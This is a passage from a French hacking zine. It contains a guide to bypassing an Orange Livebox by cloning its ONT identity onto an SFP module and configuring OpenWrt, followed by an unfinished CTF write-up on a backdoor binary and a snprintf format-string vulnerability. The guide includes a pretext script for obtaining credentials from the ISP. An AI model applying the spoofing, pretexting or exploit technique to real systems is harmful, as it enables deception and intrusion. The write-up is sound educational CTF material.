+D'ailleurs, 8311 est l'écriture leetspeak de BELL en référence à Alexander
+Graham Bell, inventeur du téléphone, et au réseau de télécommunications qu'il
+a fondé, dont sont issus les célèbres Baby Bells, incluant Bell Canada.
+
+Avant de débrancher quoi que ce soit, on va soutirer un maximum
+d'informations à la Livebox.
+Prenez des screenshots de tout. Ça vous fera gagner un temps précieux si vous
+avez oublié de noter une info.
+
+Connectez-vous à l'interface d'administration de la livebox, les creds par
+défauts sont: admin ainsi que les 6 premiers caractères du mdp Wi-Fi.
+
+Se rendre dans dans Paramètres avancés -> Informations système et faites des
+screenshots des pages suivantes:
+
+Général - infos globales de la box
+Internet - paramètres de connexion
+ONT - les infos critiques pour le bypass
+VoIP - notez votre numéro de ligne fixe, ça servira plus tard
+
+Les valeurs que vous allez injecter dans le WAS110 sont:
+Serial Number de l'ONT
+Equipment ID
+Hardware Version
+Versions des softwares (sw_verA et sw_verB)
+
+Branchement et accès au WAS110
+
+Branchez le WAS110 dans un switch compatible SFP+ ou directement dans le
+Banana Pi.
+Reliez votre PC au switch/routeur en RJ45.
+Configurez votre carte réseau en IP fixe:
+
+IP: 192.168.1.2
+Masque: 255.255.255.0
+Passerelle: 192.168.1.1
+
+Testez le ping vers l'ONT: ping 192.168.1.10
+
+Si ça répond, l'ONT est joignable.
+
+Configurer l'identité de l'ONT
+
+Connectez-vous en SSH:
+
+ssh root@192.168.1.10 # Pas de mot de passe par défaut
+
+Injectez ensuite les infos récupérées depuis la Livebox (adaptez avec vos
+propres valeurs bien sûr):
+
+fwenv_set -8 gpon_sn SMBS.....
+fwenv_set -8 equipment_id SagemcomFast5670EOFR
+fwenv_set -8 hw_ver SMBSSGLB6106
+fwenv_set -8 cp_hw_ver_sync 1
+fwenv_set -8 sw_verA SAHEOFR070102
+fwenv_set -8 sw_verB SAHEOFR070203
+fwenv_set -8 fix_vlans 0
+
+Si vous n'êtes pas à l'aise en CLI, l'interface web du firmware 8311 est
+disponible sur 192.168.1.10 et permet de faire exactement la même chose via
+votre navigateur préféré.
+
+Changez le mot de passe root par défaut pour un mot de passe fort dès
+maintenant.
+
+Fixer les VLANs
+
+Dans l'interface web, rendez-vous dans la section ISP Fixes et décochez Fix
+VLANs, puis sauvegardez.
+
+Troubleshooting: Tx fault
+
+En théorie, c'est tout ce qu'il faut faire. En pratique... j'ai galéré.
+
+En branchant le WAS110 dans le Banana Pi, OpenWrt remontait une erreur Tx
+fault dans les logs système et désactivait le port SFP.
+
+[Mar 2, 2026, 12:52:37 PM UTC] kern.info: [ 358.881756] sfp sfp1:
+module H-COM
+[Mar 2, 2026, 12:52:37 PM UTC] kern.info: [ 358.921616] hwmon hwmon2:
+temp1_input not attached to any thermal zone
+[Mar 2, 2026, 12:52:37 PM UTC] kern.err: [ 359.210690] sfp sfp1:
+module transmit fault indicated
+[Mar 2, 2026, 12:52:43 PM UTC] kern.err: [ 364.620693] sfp sfp1:
+module persistently indicates fault, disabling
+
+Les réglages de base
+
+Première chose à vérifier, depuis l'interface web du firmware 8311,
+désactivez le Tx Fault et la Serial Connection. Si vous avez suivi la config
+ci-dessus, c'est normalement déjà fait. Sinon, ça se fait aussi en SSH.
+
+Si ça ne suffit pas, on rentre dans le dur.
+
+Lire l'EEPROM du SFP
+
+Récupérez le contenu de l'EEPROM du module en base64:
+
+cat /sys/class/pon_mbox/pon_mbox0/device/eeprom50 | base64
+
+Installez ensuite l'outil de parsing et le script eeprom-vendor.js
+https://github.com/up-n-atom/8311/pull/60/commits/
+76d6cac24964cd95db625c327a5918494149c7f2#diff-
+f6ea92fc12e1775ca5da1c74abeb89a3cb4317448a1d78bec74f58e310869168
+
+pip3 install py-sfp-eeprom
+
+Lancez le script modify.py, collez le résultat base64 et validez. Il va
+générer les commandes i2cset adaptées à votre module, par exemple:
+
+i2cset -fy 0 0x51 0x7B 0x91 0x42 0xF0 0x07 i # Unlock écriture
+i2cset -fy 0 0x50 0xc8 i
+i2cset -fy 0 0x50 0x20 i
+i2cset -fy 0 0x50 0x2d i
+i2cset -fy 0 0x50 0x00 0xf5 i
+i2cset -fy 0 0x50 0x30 0x30 i
+i2cset -fy 0 0x50 0x05 0x1a i
+i2cset -fy 0 0x51 0x7B 0x00 0x00 0x00 0x00 i # Lock écriture
+
+Un reboot, et le port SFP devrait enfin remonter correctement.
+
+Ce script a été écrit par MshBidb pour m'aider à débloquer ma situation.
+Il a ensuite été intégrée via une pull request acceptée et fait maintenant
+partie du firmware 8311 officiellement: eeprom-vendor.js — firmware 8311
+(GitHub)
+
+
+-- 0x4: Configuration du Huawei MA5671A --
+
+Suite à mon erreur de diagnostic sur la technologie de ma ligne (GPON et non
+XGS-PON), j'ai dû me rabattre sur le classique Huawei MA5671A. Moins cher,
+pas la même technologie mais tout aussi efficace.
+
+Le module a été livré avec le firmware custom 8311 déjà flashé.
+
+Configurez votre carte réseau en IP fixe:
+
+IP: 192.168.1.2
+Masque: 255.255.255.0
+Passerelle: 192.168.1.1
+
+L'IP de l'ONT: 192.168.1.10
+
+Ici, l'interface web est... en chinois. Pas de panique, le SSH est notre ami !
+
+Ouvrez votre terminal et connectez-vous: ssh root@192.168.1.10
+
+Ici, on va droit au but pour injecter le numéro de série récupéré sur la
+Livebox:
+
+Configuration du Serial Number GPON:
+set_serial_number SMBS12345678
+
+Modification de l'ID matériel si nécessaire:
+sfp_i2c -i 7 -s "ABCD"
+
+On sauvegarde et on redémarre le module proprement:
+reboot
+
+
+-- 0x5: Configuration d'OpenWrt --
+
+Une fois le module SFP configuré, on le débranche du PC et on l'insère dans
+le port SFP+ (eth2) du Banana Pi BPI-R4.
+
+Et là... magie ? Pas encore il faut d'abord configurer OpenWrt.
+
+Rendez-vous sur le Firmware Selector d'OpenWrt et recherchez votre matériel:
+
+Banana Pi BPI-R4 -> téléchargez l'image SD CARD IMG
+
+Flashez l'image sur une carte SD avec Rufus (Windows) ou en CLI:
+
+sudo dd if=openwrt-24.10.5-mediatek-filogic-bananapi_bpi-r4-sdcard.img
+of=/dev/sda bs=4M status=progress
+
+Insérez la carte SD, démarrez le BPI-R4. L'interface LuCI est accessible sur
+192.168.1.1 sans mot de passe par défaut.
+
+Première chose à faire, définir un mot de passe fort. Pas 123456789, ni
+Belfort1995*. Un vrai.
+
+Récupérer vos credentials FTI
+
+Vous aurez besoin de votre login/mot de passe FTI pour générer l'option 90
+d'authentification Orange.
+
+Si vous avez bien pris les screenshots du début plus besoin d'aller dans
+l'interface d'administration de votre Livebox.
+
+Le login FTI visible dans l'interface admin de la Livebox -> Paramètres avancés
+-> Informations système -> Internet.Pour le mot de passe FTI, il faut appeler le
+3900.
+
+Prévoyez un bon café et votre meilleur déstressant, l'appel sera une longue
+route sinueuse. Voici un petit speech qui vous fera gagner un peu de temps:
+"Bonjour, je dois déplacer mon boitier fibre suite à des travaux, il me
+faudrait le mot de passe FTI de ma ligne." Personnellement j'y suis allé en
+mode bourrin, comptez ~15 min car les conseillers ne savent souvent pas ce
+que c'est.
+
+Une fois le login/mdp en main (ex: fti/exemple / exemple), rendez-vous sur le
+générateur d'option 90 de kgersen https://jsfiddle.net/kgersen/3mnsc6wy/ pour
+générer votre chaîne d'authentification.
+
+Vous obtiendrez quelque chose comme:
+
+00000000000000000000001a0900000558010341010D6674692F6578656D706C653c12...
+
+Gardez-la précieusement, elle sera injectée dans la config WAN.
+
+Configuration des interfaces (/etc/config/network)
+
+Sur le BPI-R4, l'interface WAN physique est eth2. Sur d'autres
+routeurs elle peut s'appeler eth0, eth1 ou wan. Vérifiez via LuCI si besoin.
+
+Interface LAN
+
+config interface 'lan'
+option proto 'static'
+option ipaddr '192.168.1.1'
+option netmask '255.255.255.0'
+option ip6assign '64'
+option ip6ifaceid '::bad'
+option device 'br-lan'
+
+Device VLAN 832
+
+config device
+option type '8021q'
+option ifname 'eth2'
+option vid '832'
+option name 'eth2.832
+option macaddr 'DE:AD:BE:EF:HG.20' #votre @mac pour ip static
+list egress_qos_mapping '1:0'
+list egress_qos_mapping '0:6'
+list egress_qos_mapping '6:6'
+
+Interface WAN IPv4
+
+config interface 'wan4'
+option proto 'dhcp'
+option device 'eth2.832'
+option hostname '*'
+option broadcast '1'
+option norelease '1'
+option vendorid 'sagem'
+option reqopts '1 3 6 15 28 51 58 59 90 119 125'
+option sendopts '77:2b46535644534c5f6c697665626f782e496e7465726e65
+742e736f66746174686f6d652e4c697665626f7836 90:00000000000000000000
+001a0900000558010341010D6674692F6578656D706C653c1231323334353637383
+9303132333435360313414b4685de7cee5a7f6bb2fe622e01134d'
+option clientid 'DEADBEEFHG20)' #votre @mac pour ip static
+
+Interface WAN IPv6
+
+config interface 'wan6'
+option proto 'dhcpv6'
+option device 'eth2.832'
+option reqprefix 'auto'
+option reqaddress 'none'
+option defaultreqopts '0'
+option sendopts '11:00000000000000000000001a0900000558010341010D6674
+692F6578656D706C653c12313233343536373839303132333435360313414b4685d
+e7cee5a7f6bb2fe622e01134d 15:FSVDSL_livebox.Internet.softathome.Liv
+ebox6 16:0000040e0005736167656d 17:000005580006000e495056365f5245
+51554553544544'
+option reqopts '11 17 23 24'
+option noclientfqdn '1'
+option noacceptreconfig '1'
+option clientid '00030001DEADBEEFHG20' #00030001 + @mac
+
+Mapping des flux L2 (/etc/nftables.d/nft-prio6-rules.include)
+
+Ce fichier gère la priorisation du trafic (802.1p CS6) attendue par Orange:
+
+vi /etc/nftables.d/nft-prio6-rules.include
+
+oifname "eth2.832" counter meta priority set 0:1
+oifname "eth2.832" ip protocol icmp counter meta priority set 0:6
+oifname "eth2.832" ip protocol igmp counter meta priority set 0:6
+oifname "eth2.832" udp dport 67 counter meta priority set 0:6
+oifname "eth2.832" udp dport 547 counter meta priority set 0:6
+oifname "eth2.832" ip protocol icmpv6 counter meta priority set 0:6
+
+Configuration du firewall (/etc/config/firewall)
+
+Inclusion des règles nftables
+
+config include 'orange_rules'
+option enabled '1'
+option type 'nftables'
+option path '/etc/nftables.d/nft-prio6-rules.include'
+option position 'chain-append'
+option chain 'mangle_postrouting'
+
+Zones WAN
+
+config zone
+option name 'wan'
+option output 'ACCEPT'
+option family 'ipv4'
+list network 'wan4'
+option forward 'DROP'
+option masq '1'
+option input 'DROP'
+
+config zone
+option name 'wan6'
+option input 'DROP'
+option output 'ACCEPT'
+option forward 'DROP'
+option family 'ipv6'
+list network 'wan6'
+list device 'eth2.832'
+
+Règles de filtrage
+
+config rule
+option name 'Allow-DHCP-Renew'
+option src 'wan'
+option proto 'udp'
+option dest_port '68'
+option target 'ACCEPT'
+option family 'ipv4'
+
+config rule
+option name 'Allow-Ping'
+option src 'wan'
+option proto 'icmp'
+option icmp_type 'echo-request'
+option family 'ipv4'
+option target 'ACCEPT'
+
+config rule
+option name 'Allow-IGMP'
+option src 'wan'
+option proto 'igmp'
+option family 'ipv4'
+option target 'ACCEPT'
+
+config rule
+option name 'Allow-DHCPv6'
+option proto 'udp'
+option dest_port '546'
+option family 'ipv6'
+option target 'ACCEPT'
+option src 'wan6'
+list src_ip 'fc00::/6'
+list dest_ip 'fc00::/6'
+
+config rule
+option name 'Allow-MLD'
+option proto 'icmp'
+option family 'ipv6'
+option target 'ACCEPT'
+option src 'wan6'
+list src_ip 'fe80::/10'
+
+config rule
+option name 'Allow-ICMPv6-Input'
+option proto 'icmp'
+option limit '1000/sec'
+option family 'ipv6'
+option target 'ACCEPT'
+list icmp_type 'bad-header'
+list icmp_type 'destination-unreachable'
+list icmp_type 'echo-reply'
+list icmp_type 'echo-request'
+list icmp_type 'neighbour-advertisement'
+list icmp_type 'neighbour-solicitation'
+list icmp_type 'packet-too-big'
+list icmp_type 'router-advertisement'
+list icmp_type 'router-solicitation'
+list icmp_type 'time-exceeded'
+list icmp_type 'unknown-header-type'
+option src 'wan6'
+
+config rule
+option name 'Allow-ICMPv6-Forward'
+option dest '*'
+option proto 'icmp'
+option limit '1000/sec'
+option family 'ipv6'
+option target 'ACCEPT'
+list icmp_type 'bad-header'
+list icmp_type 'destination-unreachable'
+list icmp_type 'echo-reply'
+list icmp_type 'echo-request'
+list icmp_type 'packet-too-big'
+list icmp_type 'time-exceeded'
+list icmp_type 'parameter-problem'
+list icmp_type 'unknown-header-type'
+option src 'wan6'
+
+Forwarding
+
+config forwarding
+option src 'lan'
+option dest 'wan'
+
+config forwarding
+option src 'lan'
+option dest 'wan6'
+
+DHCP & Router Advertisement (/etc/config/dhcp)
+
+config dhcp 'lan'
+option interface 'lan'
+option start '100'
+option limit '59'
+option leasetime '12h'
+option dhcpv4 'server'
+option ra 'server'
+list ra_flags 'none'
+
+Une fois tout configuré, branchez le SFP dans le port eth2, puis connectez
+votre fibre. Vous pouvez maintenant débrancher la Livebox définitivement.
+
+Pour vérifier que tout est bien remonté:
+ifstatus wan4
+ifstatus wan6
+
+J'ai également ajouté un petit ventilateur et un dissipateur thermique sur le
+SFP pour éviter la surchauffe en fonctionnement continu. Fortement
+recommandé...
+
+Cette configuration est largement inspirée du travail de Ubune sur le forum
+lafibre.info, une mine d'or pour tout ce qui touche au bypass Orange. La
+configuration TV Orange (VLAN 840 + igmpproxy) n'est pas couverte ici, je
+n'utilise pas la télé d'Orange. Si c'est votre cas, la doc complète est
+disponible sur le même forum.
+
+
+-- 0x6: Segmentation réseau --
+
+Disposant d'un switch manageable dans mon homelab, j'ai voulu segmenter le
+réseau proprement. C'est une bonne pratique niveau sécurité, chaque type
+d'équipement vit dans sa propre bulle, avec des droits d'accès strictement
+définis.
+
+Segmentation réseau par VLAN:
+
+VLAN ID : 10
+Nom     : ADMIN
+Cible   : Equipements admin
+Droits  : Accès total (SSH, WebUI, Console switch)
+
+VLAN ID : 20
+Nom     : USERS
+Cible   : Famille, appareils non-critiques
+Droits  : WAn + accès restreint SRV/apps
+
+VLAN ID : 30
+Nom     : SERVERS
+Cible   : SRV, Docker, VMs
+Droits  : Isolé - parle uniquement à ADMIN et USERS via firewall
+
+VLAN ID : 40
+Nom     : IOT
+Cible   : Ampoules, prises, caméras
+Droits  : Pas d'accès wan
+
+VLAN ID : 50
+Nom     : GUEST
+Cible   : Amis / Famille
+Droits  : Wan uniquement (2.4GHz)
+
+VLAN ID : 999
+Nom     : BLACKHOLE
+Cible   : VLAN poubelle
+Droits  : Suppression du VLAN 1 par défaut
+
+Plan d'adressage:
+
+VLAN        : 10
+Nom         : ADM
+Sous-réseau : 10.0.10.0/24
+Gateway     : 10.0.10.1
+DHCP Range  : 10.0.10.50–150
+
+VLAN        : 20
+Nom         : USERS
+Sous-réseau : 10.0.20.0/24
+Gateway     : 10.0.20.1
+DHCP Range  : 10.0.20.50–150
+
+VLAN        : 30
+Nom         : SERVERS
+Sous-réseau : 10.0.30.0/24
+Gateway     : 10.0.30.1
+DHCP Range  : 10.0.30.50–150
+
+VLAN        : 40
+Nom         : IOT
+Sous-réseau : 10.0.40.0/24
+Gateway     : 10.0.40.1
+DHCP Range  : 10.0.40.50–150
+
+VLAN        : 50
+Nom         : GUEST
+Sous-réseau : 10.0.50.0/24
+Gateway     : 10.0.50.1
+DHCP Range  : 10.0.50.50–150
+
+Configuration vlan sur OpenWrt
+
+Ne créez pas tous les VLANs d'un coup. Commencez par le VLAN
+d'administration, c'est votre filet de sécurité. Tant que vous n'avez pas un
+accès stable dessus, ne touchez à rien d'autre.
+
+Créer la zone firewall admin
+
+Avant de créer l'interface, on crée d'abord la zone firewall qui lui sera
+associée. Dans Network -> Firewall ajoutez une zone admin avec les permissions
+souhaitées.
+
+admin => wan + wan6 : accept accept accept
+
+Sauvegardez simplement.
+
+Créer l'interface VLAN 10
+
+Dans Network -> Interfaces -> Add new interface:
+
+Nom: admin
+Protocole: Static address
+Device: br-lan.10
+
+Dans l'onglet General Settings:
+
+IPv4 address: 10.0.10.1
+Netmask: 255.255.255.0
+
+Dans l'onglet Firewall Settings:
+Assignez la zone admin créée à l'étape précédente.
+
+Dans l'onglet DHCP Server:
+Start : 100, Limit : 150, Lease time : 12h
+
+Tagged/untagged vlans
+
+Une fois notre interface ainsi que la zone crée, on vas attribuer le vlan sur
+notre interface br-lan.
+
++-----+-------------------------------+
+| VLAN ID | eth1 | lan1 | lan2 | lan3 |
++---------+---------------------------+
+|   10    |  T   |  U   |      |      | 
++---------+---------------------------+
+
+J'ai mis le vlan admin en untagged sur le port lan1 (temporairement) afin 
+de pouvoir reprendre la main plus facilement si la conf de mon switch n'est pas bonne.
+
+Simplement, un port untagged (ou port access) appartient à un seul VLAN. Les
+trames qui transitent sur ce port ne portent aucune balise 802.1Q.
+
+* Le switch ajoute/retire le tag de manière transparente.
+* L'équipement connecté (PC, imprimante, caméra IP…) n'a pas connaissance du
+  VLAN, il envoie et reçoit des trames Ethernet standard.
+
+Or, un port tagged (ou port trunk) transporte plusieurs VLANs simultanément.
+Chaque trame conserve sa balise 802.1Q afin que le destinataire sache à quel
+VLAN elle appartient.
+
+* Utilisé entre deux switches, entre un switch et un routeur, ou vers un
+  hyperviseur.
+* L'équipement connecté doit comprendre le standard 802.1Q.
+
+Sauvegardez et appliquez.
+
+Accès via le VLAN admin
+
+Passez votre PC en IP statique:
+
+IP: 10.0.10.10
+Masque: 255.255.255.0
+Gateway: 10.0.10.1
+
+Puis accédez à http://10.0.10.1. Si LuCI répond, vous avez un accès sécurisé
+et vous ne perdrez plus jamais la main.
+
+Vous pouvez maintenant déployer les VLANs restants (USERS, SERVERS, IOT,
+GUEST) en répétant la même procédure pour chacun.
+
+
+-- 0x7: Vue finale de la config --
+
+Une fois tous les VLANs créés, voici à quoi ressemble le tableau de bord
+LuCI:
+
+Interfaces: 
++----------------------+----------------+----------------+
+| interface            | protocol       | IPv4           | 
++----------------------+--------+-------+----------------+
+| lan -> br-lan        | static address | 192.168.1.1/24 |
++----------------------+----------------+----------------+
+| admin -> br-lan.10   | static address | 10.0.10.1/24   |
++----------------------+----------------+----------------+
+| users -> br-lan.20   | static address | 10.0.20.1/24   |
++----------------------+----------------+----------------+
+| servers -> br-lan.30 | static address | 10.0.30.1/24   |
++----------------------+----------------+----------------+
+| iot -> br-lan.40     | static address | 10.0.40.1/24   |
++----------------------+----------------+----------------+
+| guest -> br-lan.50   | static address | 10.0.50.1/24   |
++----------------------+----------------+----------------+
+| wan -> eth2.832      | DHCP client    |                |
++----------------------+----------------+----------------+
+| wan6 -> eth2.832     | DHCPv6 client  |                |
++----------------------+----------------+----------------+
+
+
+Firewall zones:
++----------------------+--------+--------+-----------------------+
+| zone forwards        | input  | output |  intra zone forward   |
++----------------------+--------+--------+-----------------------+
+| admin -> wan, wan6   | accept | accept |       accept          |
++----------------------+--------+--------+-----------------------+
+| users -> wan, wan6   | reject | accept |       reject          |
++----------------------+--------+--------+-----------------------+
+| servers -> wan, wan6 | reject | accept |       reject          |
++----------------------+--------+--------+-----------------------+
+| iot -> all           | reject | reject |       reject          |
++----------------------+--------+--------+-----------------------+
+| guest -> wan, wan6   | reject | accept |       reject          |
++----------------------+--------+--------+-----------------------+
+| wan -> all           | reject | accept | reject +masquerading  |
++----------------------+--------+--------+-----------------------+
+| wan6 -> all          | reject | accept | reject +masquerading  |
++----------------------+--------+--------+-----------------------+
+
+Chaque zone a ses règles de forwarding adaptées (admin ->
+tout, guest-> wan uniquement, iot -> isolé).
+
+Bridge lan VLAN filtering: 	
++-----+-------------------------------+
+| VLAN ID | eth1 | lan1 | lan2 | lan3 |
++---------+---------------------------+
+|   10    |  T   |      |      |      | 
++---------+---------------------------+
+|   20    |  T   |      |      |      | 
++---------+---------------------------+
+|   30    |  T   |      |      |      | 
++---------+---------------------------+
+|   40    |  T   |      |      |      | 
++---------+---------------------------+
+|   50    |  T   |      |      |      | 
++---------+---------------------------+
+
+
+-- 0x8: Conclusion --
+
+Et voilà, la Livebox dort dans un carton et c'est vous qui êtes aux commandes.
+
+Ce projet n'est qu'une base. Il y a encore beaucoup à explorer:
+AdGuard Home pour le DNS filtering et le blocage pub au niveau réseau.
+WireGuard + Jumpserver pour un VPN maison et accéder à votre infra depuis
+l'extérieur.
+Grafana + Prometheus pour avoir des métriques sur votre trafic réseau.
+Suricata pour de la détection d'intrusion (IDS/IPS).
+Whitelists firewall: seuls certains hôtes ou ports sont autorisés.
+banIP: filtrage par ASN, pays et IPs malveillantes (équivalent pfBlocker-NG
+sous OpenWRT).
+Stack ELK: analyse forensique des logs via une VM de journalisation dédiée.
+Squid Proxy: proxy HTTP avec authentification par utilisateur ou par
+application.
+Wazuh pour m'entraîner aux action blue team: détection, alertes, corrélation
+d'events.
+
+Un grand merci à Ubune sur lafibre.info pour la base de config Orange, à
+MshBidb pour le script EEPROM et à la communauté 8311 pour le travail
+remarquable sur les firmwares ONU.
+
+Cet article est ma toute première contribution à un zine, merci à Beemo de
+m'avoir laissé cette chance.
+
+Des questions ? Des galères ? N'hésitez pas à rejoindre le discord HackGyver
+2.0. (https://discord.gg/P6dj5ayr44)
+
+-- EOF --
+::::::::::::::
+03.txt
+::::::::::::::
+  _______      ___       ______      ______    
+ /" _   "\    /. ")     /    " \    /    " \   
+(: (_/  :|   /:  /     // ____  \  // ____  \  
+ \____/ |)  //  /___  /  /    ) :)/  /    ) :) 
+    _\  '| (   / _  \(: (____/ //(: (____/ //  
+   /" \__|\|:   /_) :)\        /  \        /   
+  (________)\_______/  \"_____/    \"_____/ bauds   	
+
+┌────────────────────────────────┐
+│ ISSUE No 4 - Aout 2026  03.TXT └─────────────────────────────────────────────┐
+| ph0wn2own                                                                    |
+| Miaou                                                                        |
+| Hack-In-Provence (HiP)                                                       |
+└──────────────────────────────────────────────────────────────────────────────┘
+
+
+## [ Contexte ] ------------------------------------------------------- [ 0 ] ##
+
+Un grand merci à Azox pour ce chall !
+
+Le  Ph0wn  nous   donne  quelques  semaines  avant  le  CTF   un  petit  teasing
+sous  la   forme  d'un  chall   à  préparer  pour   le  dérouler  sur   place  :
+https://ph0wn.org/ph0wn2own/. On  obtient une image d'un  filesystem, qui semble
+"répondre à des mystérieuses requêtes réseau".
+
+
+## [ Recon ] ---------------------------------------------------------- [ 1 ] ##
+
+L'image téléchargeable est un rootfs  d'une distribution Linux (sans le kernel).
+Quelques indices traînent  pour le  kernel : le dossier /lib/modules/2.6.27.47/,
+et une mention  "Welcome to Linux 2.6.27.47  on T4X". C'est un  kernel datant de
+2010
+
+Un coup  de readelf sur quelques  libs et exécutables nous  donne l'architecture
+matérielle : ARMv5 datant d'environ 2005, processeur 32 bits en little endian.
+
+Le T4X est une gamme de téléphone VoIP  Yealink, et en creusant un peu on trouve
+le modèle  T46S :  grand écran  non tactile avec  boutons sur  le côté.  On peut
+trouver son firmware en ligne, mais ce ne sera pas très utile.
+
+En cherchant  sur le système  de fichier, on trouve  des images de  contact, par
+exemple pico.jpg :
+
+                 :-:
+            =%#######%-
+          :%%%####*#%%%=----
+         :%%##%#%%%%@%@=
+         :%%%%@@@@*@%%@@*
+         +%****: ::%%@@@@.
++%%%%%%+:=@****-   :##@@@.
+ :===   =:=**#*******#@@:
+    -+**=   +****##***=+********+====::
+ .*%%%#:    =*--+++%%*******************+
+           .::--  :   :.-======----=---
+             ::= :=..                 :
+             . ..                    =
+              :....    .:        ...:
+               :...... :-.   .....::
+                .--::.:--.....:..:.
+                  :==-=-=-:===+:.
+                    =+===....
+              =%%####*+=##*%%+
+             =##**############*:::
+            *####*#*=+=#*#***###+
+
+On tombe  aussi sur un exécutable  "backdoor". Celui-ci semble être  un ajout au
+système  de base  car readelf  nous  donne des  infos différentes  sur sa  cible
+d'architecture CPU par rapport aux autres exécutables du rootfs. Un comportement
+de  porte  dérobée pourrait  correspondre  à  quelque  chose  qui répond  à  des
+mystérieuses requêtes réseau. C'est notre cible.
+
+L'Application Binary  Interface sous ARM  est plutôt stable et  standardisée. On
+part donc des calling conventions suivantes lors d'un appel de procédure :
+-> 4 premiers arguments en registres (r0..r3 dans cet ordre)
+-> arguments suivants sur la stack
+-> retour de fonction dans r0
+-> stack descendante: la stack commence à une adresse haute (e.g. 0x4ffc)
+   et descend vers 0 jusqu'à une limite (e.g. 0x4800)
+-> CPU 32-bits, un "push" fait descendre la stack d'1 mot == 4 octets
+-> stack full-descending: en plus d'être descendante,  sp pointe vers le dernier
+   espace occupé (full)
+-> appel  avec  l'instruction  "bl"  qui "branch-link",  c'est  à  dire saute  à
+   l'adresse  donnée  et  utilise  le  registre  "lr" (= r14)  pour  enregistrer
+   l'adresse de retour de la procédure
+-> les exécutables sont en little endian  (LSB), l'octet de poids faible dans un
+   mot de plusieurs octets est à l'adresse mémoire la plus basse
+
+
+## [ Analyse de l'exé backdoor ] -------------------------------------- [ 2 ] ##
+
+L'exécutable est plutôt simple et les symboles de debug sont présents, ce qui va
+faciliter l'analyse.
+
+On a les fonctions suivantes :
+- main qui écoute sur le port 9999 en TCP, et fork pour chaque nouveau client
+  vers handle_client(socket)
+- handle_client envoie un message au client puis passe à handle_commands
+- handle_commands est le "menu principale" :
+  - reçoit une commande via parse_arg
+  - décortique puis exécute la commande :
+    - do_login demande un username/password précompilé
+    - cmd_ping, cmd_echo, cmd_info, cmd_logout demandent d'être loggué
+    - cmd_shell ne demande pas d'être loggué mais a un comportement suspect :
+      1. pioche 4 mots aléatoires
+      2. check si sont égaux à l'argument de cmd_chell
+      3. si oui, do_cmd_shell(socket)
+
+La  fonction do_cmd_shell(socket)  est  le  coeur de  la  porte  dérobée :  elle
+transforme le lien TCP  vers un shell sur la machine.  La fonction cmd_shell n'a
+pas de faille au premier abord.
+
+       +----------------------------------------------------------------+
+       |           On a maintenant l'objectif du ph0wn2own :            |
+       | soit trouver une faille pour prédire l'aléa et passer le test, |
+       | soit trouver une faille pour appeler directement do_cmd_shell. |
+       +----------------------------------------------------------------+
+
+J'ai choisi pour ce write-up  d'essayer d'appeler directement do_cmd_shell, même
+si sa construction appelle plutôt à essayer de prédire l'avenir. On discutera de
+cette fin alternative à la fin du write-up.
+
+Il faut donc commencer par trouver une faille quelque part.
+
+parse_arg est la  première candidate. Sa signature :  parse_arg(int socket, char
+*buffer, size_t max_len) Cette fonction copie jusqu'à max_len octets du lien TCP
+dans buffer et  son implémentation ne semble pas vulnérable  aux buffer overruns
+ou autre problème.
+
+Cette  fonction   donne  aussi  le   "protocole"  à  respecter  pour   parler  à
+l'application. On envoie sur  le lien TCP 4 octets en  little endian pour donner
+la taille de ce qu'on envoie, puis on envoie ce nombre d'octets. Si la taille du
+buffer qu'on  envoie dépasse la taille  max donnée à parse_arg,  alors le buffer
+est  tronqué et  seuls max_len  octets  du buffer  sont lus.  Par exemple,  pour
+l'appel de parse_arg qui récupère la commande  à exécuter, la taille max est 31.
+Les fonctions ont chacune un ou plusieurs arguments qu'elles reçoivent également
+avec parse_arg, et qui ont chacune leur  limite de taille à ne pas dépasser. Par
+exemple, pour la commande echo, on peut aller jusqu'à 0x200 octets.
+
+
+## -- ( do_login ) -------------------------------------------------- [ 2.1 ] ##
+
+C'est une  étape à franchir  pour accéder aux  autres fonctions. Elle  n'est pas
+vulnérable au  sens du  pwn, mais  elle accepte  l'utilisateur en  utilisant des
+informations compilées dans l'application, donc facile à contourner.
+
+Elle attend 2  arguments, le premier est  le username "ph0wn", le  second est le
+password "5tr0ng_P@ssw0rd!". Ceci  met à jour une variable  globale qui débloque
+l'accès aux autres commandes, où on espère trouver des failles.
+
+
+## -- ( cmd_echo ) -------------------------------------------------- [ 2.2 ] ##
+
+Cette  fonction demande  à être  logguée, puis  elle prend  un argument  qu'elle
+formate sur la socket en retour. Son fonctionnement est en gros :
+- alloue to_echo (0x200 octets) et récupère l'argument dans ce buffer
+- alloue to_print (0x800 octets) et fait un snprintf(to_print, 0x800, to_echo)
+
+Ce dernier  appel est  la vulnérabilité  : on  maitrise to_print  et on  va donc
+pouvoir en abuser.
+
+
+## [ Vulnérabilités via snprintf ] ------------------------------------ [ 3 ] ##
+
+Déjà snprintf, c'est une variadique : snprintf(to_print, 0x800, to_echo, ...).
+
+Que  se passe-t-il  si on  donne to_echo="%x  %x %x"  ? Reprenons  la convention
+d'appel de procédure :
+- premier argument dans le registre r0 -> to_print
+- deuxième argument --------------- r1 -> 0x800
+- troisième ----------------------- r2 -> to_echo
+- quatrième ----------------------- r3
+- cinquième et suivants dans la stack (le 5° poussé d'abord, ensuite le 6°,
+  ensuite le 7°, ...)
+
+Le code  de la fonction snprintf  s'exécute *comme si* l'appelant  avait préparé
+les arguments correctement en registres et  en stack. Avec l'exemple "%x %x %x",
+la fonction va donc  chercher le 4°, 5°, et 6° argument  *comme si* cmd_echo les
+avait préparés correctement, et snprintf va donc afficher le contenu de r3, puis
+le contenu de la stack au moment de l'appel.
+
+En reprenant la convention  du manuel de printf qui dit  que le premier argument
+optionnel est  l'argument numéro  1, on peut  visualiser la stack  et ce  à quoi
+snprintf va pouvoir accéder :
+
+|  argument2 <--- sp (stack pointer) au moment de l'appel
+|  argument3
+|  argument4
+|  argument5
+|  [...]
+v (adresses mémoires croissantes vers le bas)
+
+L'argument 1 n'est pas sur la stack puisque c'est le contenu du registre r3.
+
+On peut  utiliser un  modificateur pour  maîtriser plus  finement nos  lecture :
+"%k$n"  utilise directement  le  k-ième  argument, ce  qui  nous  donne accès  à
+l'endroit voulu sur la stack.
+
+         +------------------------------------------------------------+
+         | Premier outil : lecture arbitraire de la stack via "%k$x". |
+         +------------------------------------------------------------+
+
+Les fonctions  printf ont également  une capacité d'écriture qu'on  oublie parce
+que son  utilisation est  plus rare :  le convertisseur %n.  D'après le  man, il
+permet d'écrire  le nombre d'octets déjà  formatés au moment où  il apparaît. Il
+utilise l'argument passé correspondant comme un pointeur sur entier. L'opération
+pourrait s'écrire `*p_i = current_len();`. Par exemple :
+
+```c
+int i=4;
+printf("%08d %n%d", i, &i, i);
+```
+
